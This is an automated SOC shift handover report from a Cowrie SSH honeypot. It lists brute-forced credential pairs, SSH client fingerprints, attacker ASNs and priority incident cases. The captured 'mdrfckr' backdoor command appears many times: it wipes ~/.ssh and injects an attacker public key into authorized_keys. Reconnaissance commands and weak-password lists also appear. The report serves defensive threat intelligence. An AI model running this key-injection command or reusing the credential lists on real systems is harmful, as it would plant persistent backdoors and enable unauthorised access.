# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-27 |
| **Generated At** | 2026-05-27T09:59:42Z |
| **Shift Time** | 09:59 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **327** |
| Confirmed Threats | **265** |
| False Positives Filtered | **62** (19.0%) |
| Unique Attacker IPs | **42** |
| Countries of Origin | **17** |
| High Severity Cases | **46** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **281** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **93** |
| Unique Credential Pairs | **47** |
| Unique Usernames | **20** |
| Unique Passwords | **46** |
| Successful Auth Pairs | **33** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 47 |
| `345gs5662d34` | 20 |
| `systemd` | 5 |
| `ubuntu` | 4 |
| `deploy` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 22 |
| `345gs5662d34` | 20 |
| `Voidsetdownload.so` | 5 |
| `fjbdfdjkdsfs541544AA@@` | 3 |
| `123456` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 22 |
| `345gs5662d34` | `345gs5662d34` | 20 |
| `systemd` | `Voidsetdownload.so` | 5 |
| `ubuntu` | `fjbdfdjkdsfs541544AA@@` | 3 |
| `root` | `root///` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `root///` | `34.128.77.56` | 2026-05-27T04:07:36 |
| `root` | `3245gs5662d34` | `34.128.77.56` | 2026-05-27T04:07:39 |
| `root` | `Server2024!` | `113.31.115.157` | 2026-05-27T05:29:21 |
| `root` | `3245gs5662d34` | `113.31.115.157` | 2026-05-27T05:29:24 |
| `root` | `123456qQ` | `103.59.94.124` | 2026-05-27T06:06:26 |
| `root` | `3245gs5662d34` | `103.59.94.124` | 2026-05-27T06:06:30 |
| `root` | `Zx123456@` | `103.59.94.124` | 2026-05-27T06:06:51 |
| `root` | `` | `34.16.167.128` | 2026-05-27T06:12:16 |
| `root` | `ali123` | `43.108.59.27` | 2026-05-27T06:24:25 |
| `root` | `3245gs5662d34` | `43.108.59.27` | 2026-05-27T06:24:29 |
| `root` | `123654` | `152.200.205.179` | 2026-05-27T07:17:02 |
| `root` | `3245gs5662d34` | `152.200.205.179` | 2026-05-27T07:17:09 |
| `root` | `asdf@123` | `152.200.205.179` | 2026-05-27T07:18:39 |
| `root` | `abc123.com` | `152.200.205.179` | 2026-05-27T07:22:02 |
| `root` | `Ww123456` | `152.200.205.179` | 2026-05-27T07:23:47 |
| `root` | `WS@yckj2019` | `152.200.205.179` | 2026-05-27T07:27:20 |
| `root` | `ubuntu` | `124.239.153.90` | 2026-05-27T08:23:17 |
| `root` | `aA123123` | `172.191.94.172` | 2026-05-27T08:54:23 |
| `root` | `3245gs5662d34` | `172.191.94.172` | 2026-05-27T08:54:56 |
| `root` | `123456Ab` | `172.191.94.172` | 2026-05-27T09:01:39 |
| `root` | `1234Qwerty` | `101.47.156.170` | 2026-05-27T09:06:14 |
| `root` | `3245gs5662d34` | `101.47.156.170` | 2026-05-27T09:06:16 |
| `root` | `Cloud-12345` | `191.101.59.89` | 2026-05-27T09:11:12 |
| `root` | `3245gs5662d34` | `191.101.59.89` | 2026-05-27T09:11:17 |
| `root` | `abc123456.` | `35.210.61.208` | 2026-05-27T09:13:07 |
| `root` | `3245gs5662d34` | `35.210.61.208` | 2026-05-27T09:13:11 |
| `root` | `P@ssw0rd@1234` | `35.210.61.208` | 2026-05-27T09:14:33 |
| `root` | `@qwer2026` | `35.210.61.208` | 2026-05-27T09:16:02 |
| `root` | `123qweASDzxc` | `35.210.61.208` | 2026-05-27T09:17:30 |
| `root` | `dupa1234` | `35.210.61.208` | 2026-05-27T09:20:10 |
| `root` | `1Q2w3e4r` | `35.210.61.208` | 2026-05-27T09:22:56 |
| `root` | `qweasdzxc` | `172.191.94.172` | 2026-05-27T09:31:04 |
| `root` | `1q2w3e` | `172.191.94.172` | 2026-05-27T09:53:47 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **327** |
| Sessions with Fingerprint | **8** |
| Unique HASSH Fingerprints | **8** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 96 |
| Go SSH scanner | 3 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 89 | 9 |
| `03a80b21afa8...` | Modern SSH client | 5 | 3 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |
| `864cef7e4d8a...` | Mirai/variant | 1 | 1 |
| `03420fcc0e3d...` | libssh-based | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 89 | 9 | Mirai/variant |
| `03a80b21afa8...` | libssh | 5 | 3 | Modern SSH client |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |
| `864cef7e4d8a...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `03420fcc0e3d...` | libssh | 1 | 1 | libssh-based |
| `95420f9d932d...` | libssh | 1 | 1 | — |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `98ddc5604ef6...` | Go SSH scanner | 1 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 22 | 9 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `101.47.156.170`, `34.128.77.56`, `191.101.59.89`, `35.210.61.208`, `152.200.205.179`, `43.108.59.27`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **42** |
| Unique ASNs | **27** |
| High-Risk ASNs | **23** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 7 | HIGH |
| `AS396982` | Google LLC | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS9541` | Cyber Internet Services (Pvt) Ltd. | 2 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS398324` | Censys, Inc. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (46)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-cd252e42084f

| Field | Detail |
|---|---|
| **Source IP** | `34.128.77[.]56` |
| **First Seen** | 2026-05-27 04:07 |
| **Last Seen** | 2026-05-27 04:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 04:07:35` | `cowrie.session.connect` |
| `2026-05-27 04:07:35` | `cowrie.client.version` |
| `2026-05-27 04:07:35` | `cowrie.client.kex` |
| `2026-05-27 04:07:36` | `cowrie.login.success` |
| `2026-05-27 04:07:36` | `cowrie.session.params` |
| `2026-05-27 04:07:36` | `cowrie.command.input` |
| `2026-05-27 04:07:36` | `cowrie.command.failed` |
| `2026-05-27 04:07:36` | `cowrie.log.closed` |
| `2026-05-27 04:07:36` | `cowrie.session.params` |
| `2026-05-27 04:07:36` | `cowrie.command.input` |
| `2026-05-27 04:07:36` | `cowrie.session.file_download` |
| `2026-05-27 04:07:36` | `cowrie.log.closed` |
| `2026-05-27 04:07:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.128.77[.]56` to AbuseIPDB if not already reported
- [ ] Block `34.128.77[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8bfdea69b6a

| Field | Detail |
|---|---|
| **Source IP** | `34.128.77[.]56` |
| **First Seen** | 2026-05-27 04:07 |
| **Last Seen** | 2026-05-27 04:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 04:07:38` | `cowrie.session.connect` |
| `2026-05-27 04:07:39` | `cowrie.client.version` |
| `2026-05-27 04:07:39` | `cowrie.client.kex` |
| `2026-05-27 04:07:39` | `cowrie.login.success` |
| `2026-05-27 04:07:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.128.77[.]56` to AbuseIPDB if not already reported
- [ ] Block `34.128.77[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6aa31073b8d9

| Field | Detail |
|---|---|
| **Source IP** | `113.31.115[.]157` |
| **First Seen** | 2026-05-27 05:29 |
| **Last Seen** | 2026-05-27 05:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 05:29:20` | `cowrie.session.connect` |
| `2026-05-27 05:29:20` | `cowrie.client.version` |
| `2026-05-27 05:29:20` | `cowrie.client.kex` |
| `2026-05-27 05:29:21` | `cowrie.login.success` |
| `2026-05-27 05:29:21` | `cowrie.session.params` |
| `2026-05-27 05:29:21` | `cowrie.command.input` |
| `2026-05-27 05:29:21` | `cowrie.command.failed` |
| `2026-05-27 05:29:21` | `cowrie.log.closed` |
| `2026-05-27 05:29:21` | `cowrie.session.params` |
| `2026-05-27 05:29:21` | `cowrie.command.input` |
| `2026-05-27 05:29:22` | `cowrie.session.file_download` |
| `2026-05-27 05:29:22` | `cowrie.log.closed` |
| `2026-05-27 05:29:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.31.115[.]157` to AbuseIPDB if not already reported
- [ ] Block `113.31.115[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04ad82803b19

| Field | Detail |
|---|---|
| **Source IP** | `113.31.115[.]157` |
| **First Seen** | 2026-05-27 05:29 |
| **Last Seen** | 2026-05-27 05:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 05:29:24` | `cowrie.session.connect` |
| `2026-05-27 05:29:24` | `cowrie.client.version` |
| `2026-05-27 05:29:24` | `cowrie.client.kex` |
| `2026-05-27 05:29:24` | `cowrie.login.success` |
| `2026-05-27 05:29:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.31.115[.]157` to AbuseIPDB if not already reported
- [ ] Block `113.31.115[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16c081a2d0f2

| Field | Detail |
|---|---|
| **Source IP** | `103.59.94[.]124` |
| **First Seen** | 2026-05-27 06:06 |
| **Last Seen** | 2026-05-27 06:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 06:06:25` | `cowrie.session.connect` |
| `2026-05-27 06:06:25` | `cowrie.client.version` |
| `2026-05-27 06:06:25` | `cowrie.client.kex` |
| `2026-05-27 06:06:26` | `cowrie.login.success` |
| `2026-05-27 06:06:26` | `cowrie.session.params` |
| `2026-05-27 06:06:26` | `cowrie.command.input` |
| `2026-05-27 06:06:26` | `cowrie.command.failed` |
| `2026-05-27 06:06:26` | `cowrie.log.closed` |
| `2026-05-27 06:06:27` | `cowrie.session.params` |
| `2026-05-27 06:06:27` | `cowrie.command.input` |
| `2026-05-27 06:06:27` | `cowrie.session.file_download` |
| `2026-05-27 06:06:27` | `cowrie.log.closed` |
| `2026-05-27 06:06:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.94[.]124` to AbuseIPDB if not already reported
- [ ] Block `103.59.94[.]124` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61f485ac9da5

| Field | Detail |
|---|---|
| **Source IP** | `103.59.94[.]124` |
| **First Seen** | 2026-05-27 06:06 |
| **Last Seen** | 2026-05-27 06:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 06:06:29` | `cowrie.session.connect` |
| `2026-05-27 06:06:29` | `cowrie.client.version` |
| `2026-05-27 06:06:30` | `cowrie.client.kex` |
| `2026-05-27 06:06:30` | `cowrie.login.success` |
| `2026-05-27 06:06:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.94[.]124` to AbuseIPDB if not already reported
- [ ] Block `103.59.94[.]124` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-405378e4826c

| Field | Detail |
|---|---|
| **Source IP** | `103.59.94[.]124` |
| **First Seen** | 2026-05-27 06:06 |
| **Last Seen** | 2026-05-27 06:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 06:06:50` | `cowrie.session.connect` |
| `2026-05-27 06:06:50` | `cowrie.client.version` |
| `2026-05-27 06:06:51` | `cowrie.client.kex` |
| `2026-05-27 06:06:51` | `cowrie.login.success` |
| `2026-05-27 06:06:52` | `cowrie.session.params` |
| `2026-05-27 06:06:52` | `cowrie.command.input` |
| `2026-05-27 06:06:52` | `cowrie.command.failed` |
| `2026-05-27 06:06:52` | `cowrie.log.closed` |
| `2026-05-27 06:06:53` | `cowrie.session.params` |
| `2026-05-27 06:06:53` | `cowrie.command.input` |
| `2026-05-27 06:06:53` | `cowrie.session.file_download` |
| `2026-05-27 06:06:53` | `cowrie.log.closed` |
| `2026-05-27 06:06:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.94[.]124` to AbuseIPDB if not already reported
- [ ] Block `103.59.94[.]124` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4089af58c1e7

| Field | Detail |
|---|---|
| **Source IP** | `103.59.94[.]124` |
| **First Seen** | 2026-05-27 06:06 |
| **Last Seen** | 2026-05-27 06:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 06:06:55` | `cowrie.session.connect` |
| `2026-05-27 06:06:55` | `cowrie.client.version` |
| `2026-05-27 06:06:55` | `cowrie.client.kex` |
| `2026-05-27 06:06:56` | `cowrie.login.success` |
| `2026-05-27 06:06:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.94[.]124` to AbuseIPDB if not already reported
- [ ] Block `103.59.94[.]124` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e34c43e1cb7f

| Field | Detail |
|---|---|
| **Source IP** | `34.16.167[.]128` |
| **First Seen** | 2026-05-27 06:12 |
| **Last Seen** | 2026-05-27 06:12 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname, uname -a, whoami, pwd, uptime` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 06:12:15` | `cowrie.session.connect` |
| `2026-05-27 06:12:16` | `cowrie.login.success` |
| `2026-05-27 06:12:16` | `cowrie.session.params` |
| `2026-05-27 06:12:17` | `cowrie.command.input` |
| `2026-05-27 06:12:18` | `cowrie.command.input` |
| `2026-05-27 06:12:18` | `cowrie.command.input` |
| `2026-05-27 06:12:19` | `cowrie.command.input` |
| `2026-05-27 06:12:20` | `cowrie.command.input` |
| `2026-05-27 06:12:21` | `cowrie.command.input` |
| `2026-05-27 06:12:21` | `cowrie.log.closed` |
| `2026-05-27 06:12:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.16.167[.]128` to AbuseIPDB if not already reported
- [ ] Block `34.16.167[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd1181d31143

| Field | Detail |
|---|---|
| **Source IP** | `43.108.59[.]27` |
| **First Seen** | 2026-05-27 06:24 |
| **Last Seen** | 2026-05-27 06:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 06:24:24` | `cowrie.session.connect` |
| `2026-05-27 06:24:24` | `cowrie.client.version` |
| `2026-05-27 06:24:24` | `cowrie.client.kex` |
| `2026-05-27 06:24:25` | `cowrie.login.success` |
| `2026-05-27 06:24:25` | `cowrie.session.params` |
| `2026-05-27 06:24:25` | `cowrie.command.input` |
| `2026-05-27 06:24:25` | `cowrie.command.failed` |
| `2026-05-27 06:24:26` | `cowrie.log.closed` |
| `2026-05-27 06:24:26` | `cowrie.session.params` |
| `2026-05-27 06:24:26` | `cowrie.command.input` |
| `2026-05-27 06:24:26` | `cowrie.session.file_download` |
| `2026-05-27 06:24:26` | `cowrie.log.closed` |
| `2026-05-27 06:24:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.108.59[.]27` to AbuseIPDB if not already reported
- [ ] Block `43.108.59[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1ca120cea9a

| Field | Detail |
|---|---|
| **Source IP** | `43.108.59[.]27` |
| **First Seen** | 2026-05-27 06:24 |
| **Last Seen** | 2026-05-27 06:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 06:24:28` | `cowrie.session.connect` |
| `2026-05-27 06:24:28` | `cowrie.client.version` |
| `2026-05-27 06:24:28` | `cowrie.client.kex` |
| `2026-05-27 06:24:29` | `cowrie.login.success` |
| `2026-05-27 06:24:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.108.59[.]27` to AbuseIPDB if not already reported
- [ ] Block `43.108.59[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6db864fed11

| Field | Detail |
|---|---|
| **Source IP** | `152.200.205[.]179` |
| **First Seen** | 2026-05-27 07:17 |
| **Last Seen** | 2026-05-27 07:17 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 07:17:00` | `cowrie.session.connect` |
| `2026-05-27 07:17:00` | `cowrie.client.version` |
| `2026-05-27 07:17:01` | `cowrie.client.kex` |
| `2026-05-27 07:17:02` | `cowrie.login.success` |
| `2026-05-27 07:17:03` | `cowrie.session.params` |
| `2026-05-27 07:17:03` | `cowrie.command.input` |
| `2026-05-27 07:17:03` | `cowrie.command.failed` |
| `2026-05-27 07:17:03` | `cowrie.log.closed` |
| `2026-05-27 07:17:04` | `cowrie.session.params` |
| `2026-05-27 07:17:04` | `cowrie.command.input` |
| `2026-05-27 07:17:04` | `cowrie.session.file_download` |
| `2026-05-27 07:17:04` | `cowrie.log.closed` |
| `2026-05-27 07:17:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.200.205[.]179` to AbuseIPDB if not already reported
- [ ] Block `152.200.205[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
